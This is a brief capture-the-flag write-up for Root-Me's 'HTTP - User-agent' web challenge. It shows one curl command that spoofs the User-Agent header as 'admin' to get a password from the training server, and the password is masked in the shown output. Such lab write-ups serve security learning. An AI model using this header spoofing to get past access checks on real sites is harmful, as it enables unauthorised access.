# HTTP - User-agent

### Statement
https://www.root-me.org/en/Challenges/Web-Server/HTTP-User-agent

### Solution
1. This challenge is fairly simple, when accessing http://challenge01.root-me.org/web-serveur/ch2/, you will get prompted that the `user-agent` is wrong, just pass the `user-agent` header with curl for the password:
```
amemni:~$ curl -H "User-Agent: admin" http://challenge01.root-me.org/web-serveur/ch2/
<html><body><link>***<h3>Welcome master!<br/>Password:***</html>
```